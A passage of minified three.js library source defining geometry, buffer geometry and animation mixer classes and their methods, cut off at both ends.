0!==this.faceVertexUvs[0][g],t=0<r.normal.length(),u=0<r.vertexNormals.length,v=1!==r.color.r||1!==r.color.g||1!==r.color.b,\nC=0<r.vertexColors.length,w=0,w=a(w,0,0),w=a(w,1,!0),w=a(w,2,!1),w=a(w,3,s),w=a(w,4,t),w=a(w,5,u),w=a(w,6,v),w=a(w,7,C);h.push(w);h.push(r.a,r.b,r.c);h.push(r.materialIndex);s&&(s=this.faceVertexUvs[0][g],h.push(d(s[0]),d(s[1]),d(s[2])));t&&h.push(b(r.normal));u&&(t=r.vertexNormals,h.push(b(t[0]),b(t[1]),b(t[2])));v&&h.push(c(r.color));C&&(r=r.vertexColors,h.push(c(r[0]),c(r[1]),c(r[2])))}e.data={};e.data.vertices=f;e.data.normals=k;0<n.length&&(e.data.colors=n);0<m.length&&(e.data.uvs=[m]);e.data.faces=\nh;return e},clone:function(){return(new THREE.Geometry).copy(this)},copy:function(a){this.vertices=[];this.faces=[];this.faceVertexUvs=[[]];for(var b=a.vertices,c=0,d=b.length;c<d;c++)this.vertices.push(b[c].clone());b=a.faces;c=0;for(d=b.length;c<d;c++)this.faces.push(b[c].clone());c=0;for(d=a.faceVertexUvs.length;c<d;c++){b=a.faceVertexUvs[c];void 0===this.faceVertexUvs[c]&&(this.faceVertexUvs[c]=[]);for(var e=0,f=b.length;e<f;e++){for(var g=b[e],h=[],k=0,l=g.length;k<l;k++)h.push(g[k].clone());\nthis.faceVertexUvs[c].push(h)}}return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});THREE.GeometryIdCount=0;\nTHREE.DirectGeometry=function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"DirectGeometry\";this.indices=[];this.vertices=[];this.normals=[];this.colors=[];this.uvs=[];this.uvs2=[];this.groups=[];this.morphTargets={};this.skinWeights=[];this.skinIndices=[];this.boundingSphere=this.boundingBox=null;this.groupsNeedUpdate=this.uvsNeedUpdate=this.colorsNeedUpdate=this.normalsNeedUpdate=this.verticesNeedUpdate=!1};\nObject.assign(THREE.DirectGeometry.prototype,THREE.EventDispatcher.prototype,{computeBoundingBox:THREE.Geometry.prototype.computeBoundingBox,computeBoundingSphere:THREE.Geometry.prototype.computeBoundingSphere,computeFaceNormals:function(){console.warn(\"THREE.DirectGeometry: computeFaceNormals() is not a method of this type of geometry.\")},computeVertexNormals:function(){console.warn(\"THREE.DirectGeometry: computeVertexNormals() is not a method of this type of geometry.\")},computeGroups:function(a){var b,\nc=[],d;a=a.faces;for(var e=0;e<a.length;e++){var f=a[e];f.materialIndex!==d&&(d=f.materialIndex,void 0!==b&&(b.count=3*e-b.start,c.push(b)),b={start:3*e,materialIndex:d})}void 0!==b&&(b.count=3*e-b.start,c.push(b));this.groups=c},fromGeometry:function(a){var b=a.faces,c=a.vertices,d=a.faceVertexUvs,e=d[0]&&0<d[0].length,f=d[1]&&0<d[1].length,g=a.morphTargets,h=g.length,k;if(0<h){k=[];for(var l=0;l<h;l++)k[l]=[];this.morphTargets.position=k}var n=a.morphNormals,p=n.length,m;if(0<p){m=[];for(l=0;l<\np;l++)m[l]=[];this.morphTargets.normal=m}for(var q=a.skinIndices,r=a.skinWeights,s=q.length===c.length,t=r.length===c.length,l=0;l<b.length;l++){var u=b[l];this.vertices.push(c[u.a],c[u.b],c[u.c]);var v=u.vertexNormals;3===v.length?this.normals.push(v[0],v[1],v[2]):(v=u.normal,this.normals.push(v,v,v));v=u.vertexColors;3===v.length?this.colors.push(v[0],v[1],v[2]):(v=u.color,this.colors.push(v,v,v));!0===e&&(v=d[0][l],void 0!==v?this.uvs.push(v[0],v[1],v[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv \",\nl),this.uvs.push(new THREE.Vector2,new THREE.Vector2,new THREE.Vector2)));!0===f&&(v=d[1][l],void 0!==v?this.uvs2.push(v[0],v[1],v[2]):(console.warn(\"THREE.DirectGeometry.fromGeometry(): Undefined vertexUv2 \",l),this.uvs2.push(new THREE.Vector2,new THREE.Vector2,new THREE.Vector2)));for(v=0;v<h;v++){var C=g[v].vertices;k[v].push(C[u.a],C[u.b],C[u.c])}for(v=0;v<p;v++)C=n[v].vertexNormals[l],m[v].push(C.a,C.b,C.c);s&&this.skinIndices.push(q[u.a],q[u.b],q[u.c]);t&&this.skinWeights.push(r[u.a],r[u.b],\nr[u.c])}this.computeGroups(a);this.verticesNeedUpdate=a.verticesNeedUpdate;this.normalsNeedUpdate=a.normalsNeedUpdate;this.colorsNeedUpdate=a.colorsNeedUpdate;this.uvsNeedUpdate=a.uvsNeedUpdate;this.groupsNeedUpdate=a.groupsNeedUpdate;return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});\nTHREE.BufferGeometry=function(){Object.defineProperty(this,\"id\",{value:THREE.GeometryIdCount++});this.uuid=THREE.Math.generateUUID();this.name=\"\";this.type=\"BufferGeometry\";this.index=null;this.attributes={};this.morphAttributes={};this.groups=[];this.boundingSphere=this.boundingBox=null;this.drawRange={start:0,count:Infinity}};\nObject.assign(THREE.BufferGeometry.prototype,THREE.EventDispatcher.prototype,{getIndex:function(){return this.index},setIndex:function(a){this.index=a},addAttribute:function(a,b,c){if(!1===b instanceof THREE.BufferAttribute&&!1===b instanceof THREE.InterleavedBufferAttribute)console.warn(\"THREE.BufferGeometry: .addAttribute() now expects ( name, attribute ).\"),this.addAttribute(a,new THREE.BufferAttribute(b,c));else if(\"index\"===a)console.warn(\"THREE.BufferGeometry.addAttribute: Use .setIndex() for index attribute.\"),\nthis.setIndex(b);else return this.attributes[a]=b,this},getAttribute:function(a){return this.attributes[a]},removeAttribute:function(a){delete this.attributes[a];return this},addGroup:function(a,b,c){this.groups.push({start:a,count:b,materialIndex:void 0!==c?c:0})},clearGroups:function(){this.groups=[]},setDrawRange:function(a,b){this.drawRange.start=a;this.drawRange.count=b},applyMatrix:function(a){var b=this.attributes.position;void 0!==b&&(a.applyToVector3Array(b.array),b.needsUpdate=!0);b=this.attributes.normal;\nvoid 0!==b&&((new THREE.Matrix3).getNormalMatrix(a).applyToVector3Array(b.array),b.needsUpdate=!0);null!==this.boundingBox&&this.computeBoundingBox();null!==this.boundingSphere&&this.computeBoundingSphere();return this},rotateX:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationX(b);this.applyMatrix(a);return this}}(),rotateY:function(){var a;return function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationY(b);this.applyMatrix(a);return this}}(),rotateZ:function(){var a;\nreturn function(b){void 0===a&&(a=new THREE.Matrix4);a.makeRotationZ(b);this.applyMatrix(a);return this}}(),translate:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeTranslation(b,c,d);this.applyMatrix(a);return this}}(),scale:function(){var a;return function(b,c,d){void 0===a&&(a=new THREE.Matrix4);a.makeScale(b,c,d);this.applyMatrix(a);return this}}(),lookAt:function(){var a;return function(b){void 0===a&&(a=new THREE.Object3D);a.lookAt(b);a.updateMatrix();this.applyMatrix(a.matrix)}}(),\ncenter:function(){this.computeBoundingBox();var a=this.boundingBox.center().negate();this.translate(a.x,a.y,a.z);return a},setFromObject:function(a){var b=a.geometry;if(a instanceof THREE.Points||a instanceof THREE.Line){a=new THREE.Float32Attribute(3*b.vertices.length,3);var c=new THREE.Float32Attribute(3*b.colors.length,3);this.addAttribute(\"position\",a.copyVector3sArray(b.vertices));this.addAttribute(\"color\",c.copyColorsArray(b.colors));b.lineDistances&&b.lineDistances.length===b.vertices.length&&\n(a=new THREE.Float32Attribute(b.lineDistances.length,1),this.addAttribute(\"lineDistance\",a.copyArray(b.lineDistances)));null!==b.boundingSphere&&(this.boundingSphere=b.boundingSphere.clone());null!==b.boundingBox&&(this.boundingBox=b.boundingBox.clone())}else a instanceof THREE.Mesh&&b instanceof THREE.Geometry&&this.fromGeometry(b);return this},updateFromObject:function(a){var b=a.geometry;if(a instanceof THREE.Mesh){var c=b.__directGeometry;if(void 0===c)return this.fromGeometry(b);c.verticesNeedUpdate=\nb.verticesNeedUpdate;c.normalsNeedUpdate=b.normalsNeedUpdate;c.colorsNeedUpdate=b.colorsNeedUpdate;c.uvsNeedUpdate=b.uvsNeedUpdate;c.groupsNeedUpdate=b.groupsNeedUpdate;b.verticesNeedUpdate=!1;b.normalsNeedUpdate=!1;b.colorsNeedUpdate=!1;b.uvsNeedUpdate=!1;b.groupsNeedUpdate=!1;b=c}!0===b.verticesNeedUpdate&&(c=this.attributes.position,void 0!==c&&(c.copyVector3sArray(b.vertices),c.needsUpdate=!0),b.verticesNeedUpdate=!1);!0===b.normalsNeedUpdate&&(c=this.attributes.normal,void 0!==c&&(c.copyVector3sArray(b.normals),\nc.needsUpdate=!0),b.normalsNeedUpdate=!1);!0===b.colorsNeedUpdate&&(c=this.attributes.color,void 0!==c&&(c.copyColorsArray(b.colors),c.needsUpdate=!0),b.colorsNeedUpdate=!1);b.uvsNeedUpdate&&(c=this.attributes.uv,void 0!==c&&(c.copyVector2sArray(b.uvs),c.needsUpdate=!0),b.uvsNeedUpdate=!1);b.lineDistancesNeedUpdate&&(c=this.attributes.lineDistance,void 0!==c&&(c.copyArray(b.lineDistances),c.needsUpdate=!0),b.lineDistancesNeedUpdate=!1);b.groupsNeedUpdate&&(b.computeGroups(a.geometry),this.groups=\nb.groups,b.groupsNeedUpdate=!1);return this},fromGeometry:function(a){a.__directGeometry=(new THREE.DirectGeometry).fromGeometry(a);return this.fromDirectGeometry(a.__directGeometry)},fromDirectGeometry:function(a){var b=new Float32Array(3*a.vertices.length);this.addAttribute(\"position\",(new THREE.BufferAttribute(b,3)).copyVector3sArray(a.vertices));0<a.normals.length&&(b=new Float32Array(3*a.normals.length),this.addAttribute(\"normal\",(new THREE.BufferAttribute(b,3)).copyVector3sArray(a.normals)));\n0<a.colors.length&&(b=new Float32Array(3*a.colors.length),this.addAttribute(\"color\",(new THREE.BufferAttribute(b,3)).copyColorsArray(a.colors)));0<a.uvs.length&&(b=new Float32Array(2*a.uvs.length),this.addAttribute(\"uv\",(new THREE.BufferAttribute(b,2)).copyVector2sArray(a.uvs)));0<a.uvs2.length&&(b=new Float32Array(2*a.uvs2.length),this.addAttribute(\"uv2\",(new THREE.BufferAttribute(b,2)).copyVector2sArray(a.uvs2)));0<a.indices.length&&(b=new (65535<a.vertices.length?Uint32Array:Uint16Array)(3*a.indices.length),\nthis.setIndex((new THREE.BufferAttribute(b,1)).copyIndicesArray(a.indices)));this.groups=a.groups;for(var c in a.morphTargets){for(var b=[],d=a.morphTargets[c],e=0,f=d.length;e<f;e++){var g=d[e],h=new THREE.Float32Attribute(3*g.length,3);b.push(h.copyVector3sArray(g))}this.morphAttributes[c]=b}0<a.skinIndices.length&&(c=new THREE.Float32Attribute(4*a.skinIndices.length,4),this.addAttribute(\"skinIndex\",c.copyVector4sArray(a.skinIndices)));0<a.skinWeights.length&&(c=new THREE.Float32Attribute(4*a.skinWeights.length,\n4),this.addAttribute(\"skinWeight\",c.copyVector4sArray(a.skinWeights)));null!==a.boundingSphere&&(this.boundingSphere=a.boundingSphere.clone());null!==a.boundingBox&&(this.boundingBox=a.boundingBox.clone());return this},computeBoundingBox:function(){null===this.boundingBox&&(this.boundingBox=new THREE.Box3);var a=this.attributes.position.array;void 0!==a?this.boundingBox.setFromArray(a):this.boundingBox.makeEmpty();(isNaN(this.boundingBox.min.x)||isNaN(this.boundingBox.min.y)||isNaN(this.boundingBox.min.z))&&\nconsole.error('THREE.BufferGeometry.computeBoundingBox: Computed min/max have NaN values. The \"position\" attribute is likely to have NaN values.',this)},computeBoundingSphere:function(){var a=new THREE.Box3,b=new THREE.Vector3;return function(){null===this.boundingSphere&&(this.boundingSphere=new THREE.Sphere);var c=this.attributes.position;if(c){var c=c.array,d=this.boundingSphere.center;a.setFromArray(c);a.center(d);for(var e=0,f=0,g=c.length;f<g;f+=3)b.fromArray(c,f),e=Math.max(e,d.distanceToSquared(b));\nthis.boundingSphere.radius=Math.sqrt(e);isNaN(this.boundingSphere.radius)&&console.error('THREE.BufferGeometry.computeBoundingSphere(): Computed radius is NaN. The \"position\" attribute is likely to have NaN values.',this)}}}(),computeFaceNormals:function(){},computeVertexNormals:function(){var a=this.index,b=this.attributes,c=this.groups;if(b.position){var d=b.position.array;if(void 0===b.normal)this.addAttribute(\"normal\",new THREE.BufferAttribute(new Float32Array(d.length),3));else for(var e=b.normal.array,\nf=0,g=e.length;f<g;f++)e[f]=0;var e=b.normal.array,h,k,l,n=new THREE.Vector3,p=new THREE.Vector3,m=new THREE.Vector3,q=new THREE.Vector3,r=new THREE.Vector3;if(a){a=a.array;0===c.length&&this.addGroup(0,a.length);for(var s=0,t=c.length;s<t;++s)for(f=c[s],g=f.start,h=f.count,f=g,g+=h;f<g;f+=3)h=3*a[f+0],k=3*a[f+1],l=3*a[f+2],n.fromArray(d,h),p.fromArray(d,k),m.fromArray(d,l),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[h]+=q.x,e[h+1]+=q.y,e[h+2]+=q.z,e[k]+=q.x,e[k+1]+=q.y,e[k+2]+=q.z,e[l]+=q.x,\ne[l+1]+=q.y,e[l+2]+=q.z}else for(f=0,g=d.length;f<g;f+=9)n.fromArray(d,f),p.fromArray(d,f+3),m.fromArray(d,f+6),q.subVectors(m,p),r.subVectors(n,p),q.cross(r),e[f]=q.x,e[f+1]=q.y,e[f+2]=q.z,e[f+3]=q.x,e[f+4]=q.y,e[f+5]=q.z,e[f+6]=q.x,e[f+7]=q.y,e[f+8]=q.z;this.normalizeNormals();b.normal.needsUpdate=!0}},merge:function(a,b){if(!1===a instanceof THREE.BufferGeometry)console.error(\"THREE.BufferGeometry.merge(): geometry not an instance of THREE.BufferGeometry.\",a);else{void 0===b&&(b=0);var c=this.attributes,\nd;for(d in c)if(void 0!==a.attributes[d])for(var e=c[d].array,f=a.attributes[d],g=f.array,h=0,f=f.itemSize*b;h<g.length;h++,f++)e[f]=g[h];return this}},normalizeNormals:function(){for(var a=this.attributes.normal.array,b,c,d,e=0,f=a.length;e<f;e+=3)b=a[e],c=a[e+1],d=a[e+2],b=1/Math.sqrt(b*b+c*c+d*d),a[e]*=b,a[e+1]*=b,a[e+2]*=b},toNonIndexed:function(){if(null===this.index)return console.warn(\"THREE.BufferGeometry.toNonIndexed(): Geometry is already non-indexed.\"),this;var a=new THREE.BufferGeometry,\nb=this.index.array,c=this.attributes,d;for(d in c){for(var e=c[d],f=e.array,e=e.itemSize,g=new f.constructor(b.length*e),h=0,k=0,l=0,n=b.length;l<n;l++)for(var h=b[l]*e,p=0;p<e;p++)g[k++]=f[h++];a.addAttribute(d,new THREE.BufferAttribute(g,e))}return a},toJSON:function(){var a={metadata:{version:4.4,type:\"BufferGeometry\",generator:\"BufferGeometry.toJSON\"}};a.uuid=this.uuid;a.type=this.type;\"\"!==this.name&&(a.name=this.name);if(void 0!==this.parameters){var b=this.parameters,c;for(c in b)void 0!==\nb[c]&&(a[c]=b[c]);return a}a.data={attributes:{}};var d=this.index;null!==d&&(b=Array.prototype.slice.call(d.array),a.data.index={type:d.array.constructor.name,array:b});d=this.attributes;for(c in d){var e=d[c],b=Array.prototype.slice.call(e.array);a.data.attributes[c]={itemSize:e.itemSize,type:e.array.constructor.name,array:b,normalized:e.normalized}}c=this.groups;0<c.length&&(a.data.groups=JSON.parse(JSON.stringify(c)));c=this.boundingSphere;null!==c&&(a.data.boundingSphere={center:c.center.toArray(),\nradius:c.radius});return a},clone:function(){return(new THREE.BufferGeometry).copy(this)},copy:function(a){var b=a.index;null!==b&&this.setIndex(b.clone());var b=a.attributes,c;for(c in b)this.addAttribute(c,b[c].clone());a=a.groups;c=0;for(b=a.length;c<b;c++){var d=a[c];this.addGroup(d.start,d.count,d.materialIndex)}return this},dispose:function(){this.dispatchEvent({type:\"dispose\"})}});THREE.BufferGeometry.MaxIndex=65535;\nTHREE.InstancedBufferGeometry=function(){THREE.BufferGeometry.call(this);this.type=\"InstancedBufferGeometry\";this.maxInstancedCount=void 0};THREE.InstancedBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.InstancedBufferGeometry.prototype.constructor=THREE.InstancedBufferGeometry;THREE.InstancedBufferGeometry.prototype.addGroup=function(a,b,c){this.groups.push({start:a,count:b,instances:c})};\nTHREE.InstancedBufferGeometry.prototype.copy=function(a){var b=a.index;null!==b&&this.setIndex(b.clone());var b=a.attributes,c;for(c in b)this.addAttribute(c,b[c].clone());a=a.groups;c=0;for(b=a.length;c<b;c++){var d=a[c];this.addGroup(d.start,d.count,d.instances)}return this};THREE.Uniform=function(a,b){\"string\"===typeof a&&(console.warn(\"THREE.Uniform: Type parameter is no longer needed.\"),a=b);this.value=a;this.dynamic=!1};\nTHREE.Uniform.prototype={constructor:THREE.Uniform,onUpdate:function(a){this.dynamic=!0;this.onUpdateCallback=a;return this}};THREE.AnimationAction=function(){throw Error(\"THREE.AnimationAction: Use mixer.clipAction for construction.\");};\nTHREE.AnimationAction._new=function(a,b,c){this._mixer=a;this._clip=b;this._localRoot=c||null;a=b.tracks;b=a.length;c=Array(b);for(var d={endingStart:THREE.ZeroCurvatureEnding,endingEnd:THREE.ZeroCurvatureEnding},e=0;e!==b;++e){var f=a[e].createInterpolant(null);c[e]=f;f.settings=d}this._interpolantSettings=d;this._interpolants=c;this._propertyBindings=Array(b);this._weightInterpolant=this._timeScaleInterpolant=this._byClipCacheIndex=this._cacheIndex=null;this.loop=THREE.LoopRepeat;this._loopCount=\n-1;this._startTime=null;this.time=0;this._effectiveWeight=this.weight=this._effectiveTimeScale=this.timeScale=1;this.repetitions=Infinity;this.paused=!1;this.enabled=!0;this.clampWhenFinished=!1;this.zeroSlopeAtEnd=this.zeroSlopeAtStart=!0};\nTHREE.AnimationAction._new.prototype={constructor:THREE.AnimationAction._new,play:function(){this._mixer._activateAction(this);return this},stop:function(){this._mixer._deactivateAction(this);return this.reset()},reset:function(){this.paused=!1;this.enabled=!0;this.time=0;this._loopCount=-1;this._startTime=null;return this.stopFading().stopWarping()},isRunning:function(){return this.enabled&&!this.paused&&0!==this.timeScale&&null===this._startTime&&this._mixer._isActiveAction(this)},isScheduled:function(){return this._mixer._isActiveAction(this)},\nstartAt:function(a){this._startTime=a;return this},setLoop:function(a,b){this.loop=a;this.repetitions=b;return this},setEffectiveWeight:function(a){this.weight=a;this._effectiveWeight=this.enabled?a:0;return this.stopFading()},getEffectiveWeight:function(){return this._effectiveWeight},fadeIn:function(a){return this._scheduleFading(a,0,1)},fadeOut:function(a){return this._scheduleFading(a,1,0)},crossFadeFrom:function(a,b,c){a.fadeOut(b);this.fadeIn(b);if(c){c=this._clip.duration;var d=a._clip.duration,\ne=c/d;a.warp(1,d/c,b);this.warp(e,1,b)}return this},crossFadeTo:function(a,b,c){return a.crossFadeFrom(this,b,c)},stopFading:function(){var a=this._weightInterpolant;null!==a&&(this._weightInterpolant=null,this._mixer._takeBackControlInterpolant(a));return this},setEffectiveTimeScale:function(a){this.timeScale=a;this._effectiveTimeScale=this.paused?0:a;return this.stopWarping()},getEffectiveTimeScale:function(){return this._effectiveTimeScale},setDuration:function(a){this.timeScale=this._clip.duration/\na;return this.stopWarping()},syncWith:function(a){this.time=a.time;this.timeScale=a.timeScale;return this.stopWarping()},halt:function(a){return this.warp(this._effectiveTimeScale,0,a)},warp:function(a,b,c){var d=this._mixer,e=d.time,f=this._timeScaleInterpolant,g=this.timeScale;null===f&&(this._timeScaleInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;f=f.sampleValues;d[0]=e;d[1]=e+c;f[0]=a/g;f[1]=b/g;return this},stopWarping:function(){var a=this._timeScaleInterpolant;null!==a&&\n(this._timeScaleInterpolant=null,this._mixer._takeBackControlInterpolant(a));return this},getMixer:function(){return this._mixer},getClip:function(){return this._clip},getRoot:function(){return this._localRoot||this._mixer._root},_update:function(a,b,c,d){var e=this._startTime;if(null!==e){b=(a-e)*c;if(0>b||0===c)return;this._startTime=null;b*=c}b*=this._updateTimeScale(a);c=this._updateTime(b);a=this._updateWeight(a);if(0<a){b=this._interpolants;for(var e=this._propertyBindings,f=0,g=b.length;f!==\ng;++f)b[f].evaluate(c),e[f].accumulate(d,a)}},_updateWeight:function(a){var b=0;if(this.enabled){var b=this.weight,c=this._weightInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopFading(),0===d&&(this.enabled=!1))}}return this._effectiveWeight=b},_updateTimeScale:function(a){var b=0;if(!this.paused){var b=this.timeScale,c=this._timeScaleInterpolant;if(null!==c){var d=c.evaluate(a)[0],b=b*d;a>c.parameterPositions[1]&&(this.stopWarping(),0===b?this.paused=!0:\nthis.timeScale=b)}}return this._effectiveTimeScale=b},_updateTime:function(a){var b=this.time+a;if(0===a)return b;var c=this._clip.duration,d=this.loop,e=this._loopCount;if(d===THREE.LoopOnce)a:{if(-1===e&&(this.loopCount=0,this._setEndings(!0,!0,!1)),b>=c)b=c;else if(0>b)b=0;else break a;this.clampWhenFinished?this.paused=!0:this.enabled=!1;this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0>a?-1:1})}else{d=d===THREE.LoopPingPong;-1===e&&(0<=a?(e=0,this._setEndings(!0,0===this.repetitions,\nd)):this._setEndings(0===this.repetitions,!0,d));if(b>=c||0>b){var f=Math.floor(b/c),b=b-c*f,e=e+Math.abs(f),g=this.repetitions-e;0>g?(this.clampWhenFinished?this.paused=!0:this.enabled=!1,b=0<a?c:0,this._mixer.dispatchEvent({type:\"finished\",action:this,direction:0<a?1:-1})):(0===g?(a=0>a,this._setEndings(a,!a,d)):this._setEndings(!1,!1,d),this._loopCount=e,this._mixer.dispatchEvent({type:\"loop\",action:this,loopDelta:f}))}if(d&&1===(e&1))return this.time=b,c-b}return this.time=b},_setEndings:function(a,\nb,c){var d=this._interpolantSettings;c?(d.endingStart=THREE.ZeroSlopeEnding,d.endingEnd=THREE.ZeroSlopeEnding):(d.endingStart=a?this.zeroSlopeAtStart?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding,d.endingEnd=b?this.zeroSlopeAtEnd?THREE.ZeroSlopeEnding:THREE.ZeroCurvatureEnding:THREE.WrapAroundEnding)},_scheduleFading:function(a,b,c){var d=this._mixer,e=d.time,f=this._weightInterpolant;null===f&&(this._weightInterpolant=f=d._lendControlInterpolant());d=f.parameterPositions;\nf=f.sampleValues;d[0]=e;f[0]=b;d[1]=e+a;f[1]=c;return this}};THREE.AnimationClip=function(a,b,c){this.name=a;this.tracks=c;this.duration=void 0!==b?b:-1;this.uuid=THREE.Math.generateUUID();0>this.duration&&this.resetDuration();this.trim();this.optimize()};\nTHREE.AnimationClip.prototype={constructor:THREE.AnimationClip,resetDuration:function(){for(var a=0,b=0,c=this.tracks.length;b!==c;++b)var d=this.tracks[b],a=Math.max(a,d.times[d.times.length-1]);this.duration=a},trim:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].trim(0,this.duration);return this},optimize:function(){for(var a=0;a<this.tracks.length;a++)this.tracks[a].optimize();return this}};\nObject.assign(THREE.AnimationClip,{parse:function(a){for(var b=[],c=a.tracks,d=1/(a.fps||1),e=0,f=c.length;e!==f;++e)b.push(THREE.KeyframeTrack.parse(c[e]).scale(d));return new THREE.AnimationClip(a.name,a.duration,b)},toJSON:function(a){var b=[],c=a.tracks;a={name:a.name,duration:a.duration,tracks:b};for(var d=0,e=c.length;d!==e;++d)b.push(THREE.KeyframeTrack.toJSON(c[d]));return a},CreateFromMorphTargetSequence:function(a,b,c,d){for(var e=b.length,f=[],g=0;g<e;g++){var h=[],k=[];h.push((g+e-1)%\ne,g,(g+1)%e);k.push(0,1,0);var l=THREE.AnimationUtils.getKeyframeOrder(h),h=THREE.AnimationUtils.sortedArray(h,1,l),k=THREE.AnimationUtils.sortedArray(k,1,l);d||0!==h[0]||(h.push(e),k.push(k[0]));f.push((new THREE.NumberKeyframeTrack(\".morphTargetInfluences[\"+b[g].name+\"]\",h,k)).scale(1/c))}return new THREE.AnimationClip(a,-1,f)},findByName:function(a,b){var c=a;Array.isArray(a)||(c=a.geometry&&a.geometry.animations||a.animations);for(var d=0;d<c.length;d++)if(c[d].name===b)return c[d];return null},\nCreateClipsFromMorphTargetSequences:function(a,b,c){for(var d={},e=/^([\\w-]*?)([\\d]+)$/,f=0,g=a.length;f<g;f++){var h=a[f],k=h.name.match(e);if(k&&1<k.length){var l=k[1];(k=d[l])||(d[l]=k=[]);k.push(h)}}a=[];for(l in d)a.push(THREE.AnimationClip.CreateFromMorphTargetSequence(l,d[l],b,c));return a},parseAnimation:function(a,b,c){if(!a)return console.error(\"  no animation in JSONLoader data\"),null;c=function(a,b,c,d,e){if(0!==c.length){var f=[],g=[];THREE.AnimationUtils.flattenJSON(c,f,g,d);0!==f.length&&\ne.push(new a(b,f,g))}};var d=[],e=a.name||\"default\",f=a.length||-1,g=a.fps||30;a=a.hierarchy||[];for(var h=0;h<a.length;h++){var k=a[h].keys;if(k&&0!==k.length)if(k[0].morphTargets){for(var f={},l=0;l<k.length;l++)if(k[l].morphTargets)for(var n=0;n<k[l].morphTargets.length;n++)f[k[l].morphTargets[n]]=-1;for(var p in f){for(var m=[],q=[],n=0;n!==k[l].morphTargets.length;++n){var r=k[l];m.push(r.time);q.push(r.morphTarget===p?1:0)}d.push(new THREE.NumberKeyframeTrack(\".morphTargetInfluence[\"+p+\"]\",\nm,q))}f=f.length*(g||1)}else l=\".bones[\"+b[h].name+\"]\",c(THREE.VectorKeyframeTrack,l+\".position\",k,\"pos\",d),c(THREE.QuaternionKeyframeTrack,l+\".quaternion\",k,\"rot\",d),c(THREE.VectorKeyframeTrack,l+\".scale\",k,\"scl\",d)}return 0===d.length?null:new THREE.AnimationClip(e,f,d)}});THREE.AnimationMixer=function(a){this._root=a;this._initMemoryManager();this.time=this._accuIndex=0;this.timeScale=1};\nObject.assign(THREE.AnimationMixer.prototype,THREE.EventDispatcher.prototype,{clipAction:function(a,b){var c=b||this._root,d=c.uuid,e=\"string\"===typeof a?THREE.AnimationClip.findByName(c,a):a,c=null!==e?e.uuid:a,f=this._actionsByClip[c],g=null;if(void 0!==f){g=f.actionByRoot[d];if(void 0!==g)return g;g=f.knownActions[0];null===e&&(e=g._clip)}if(null===e)return null;e=new THREE.AnimationMixer._Action(this,e,b);this._bindAction(e,g);this._addInactiveAction(e,c,d);return e},existingAction:function(a,\nb){var c=b||this._root,d=c.uuid,c=\"string\"===typeof a?THREE.AnimationClip.findByName(c,a):a,c=this._actionsByClip[c?c.uuid:a];return void 0!==c?c.actionByRoot[d]||null:null},stopAllAction:function(){for(var a=this._actions,b=this._nActiveActions,c=this._bindings,d=this._nActiveBindings,e=this._nActiveBindings=this._nActiveActions=0;e!==b;++e)a[e].reset();for(e=0;e!==d;++e)c[e].useCount=0;return this},update:function(a){a*=this.timeScale;for(var b=this._actions,c=this._nActiveActions,d=this.time+=\na,e=Math.sign(a),f=this._accuIndex^=1,g=0;g!==c;++g){var h=b[g];h.enabled&&h._update(d,a,e,f)}a=this._bindings;b=this._nActiveBindings;for(g=0;g!==b;++g)a[g].apply(f);return this},getRoot:function(){return this._root},uncacheClip:function(a){var b=this._actions;a=a.uuid;var c=this._actionsByClip,d=c[a];if(void 0!==d){for(var d=d.knownActions,e=0,f=d.length;e!==f;++e){var g=d[e];this._deactivateAction(g);var h=g._cacheIndex,k=b[b.length-1];g._cacheIndex=null;g._byClipCacheIndex=null;k._cacheIndex=\nh;b[h]=k;b.pop();this._removeInactiveBindingsForAction(g)}delete c[a]}},uncacheRoot:function(a){a=a.uuid;var b=this._actionsByClip,c;for(c in b){var d=b[c].actionByRoot[a];void 0!==d&&(this._deactivateAction(d),this._removeInactiveAction(d))}c=this._bindingsByRootAndName[a];if(void 0!==c)for(var e in c)a=c[e],a.restoreOriginalState(),this._removeInactiveBinding(a)},uncacheAction:function(a,b){var c=this.existingAction(a,b);null!==c&&(this._deactivateAction(c),this._removeInactiveAction(c))}});\nTHREE.AnimationMixer._Action=THREE.AnimationAction._new;\nObject.assign(THREE.AnimationMixer.prototype,{_bindAction:function(a,b){var c=a._localRoot||this._root,d=a._clip.tracks,e=d.length,f=a._propertyBindings,g=a._interpolants,h=c.uuid,k=this._bindingsByRootAndName,l=k[h];void 0===l&&(l={},k[h]=l);for(k=0;k!==e;++k){var n=d[k],p=n.name,m=l[p];if(void 0===m){m=f[k];if(void 0!==m){null===m._cacheIndex&&(++m.referenceCount,this._addInactiveBinding(m,h,p));continue}m=new THREE.PropertyMixer(THREE.PropertyBinding.create(c,p,b&&b._propertyBindings[k].binding.parsedPath),\nn.ValueTypeName,n.getValueSize());++m.referenceCount;this._addInactiveBinding(m,h,p)}f[k]=m;g[k].resultBuffer=m.buffer}},_activateAction:function(a){if(!this._isActiveAction(a)){if(null===a._cacheIndex){var b=(a._localRoot||this._root).uuid,c=a._clip.uuid,d=this._actionsByClip[c];this._bindAction(a,d&&d.knownActions[0]);this._addInactiveAction(a,c,b)}b=a._propertyBindings;c=0;for(d=b.length;c!==d;++c){var e=b[c];0===e.useCount++&&(this._lendBinding(e),e.saveOriginalState())}this._lendAction(a)}},\n_deactivateAction:function(a){if(this._isActiveAction(a)){for(var b=a._propertyBindings,c=0,d=b.length;c!==d;++c){var 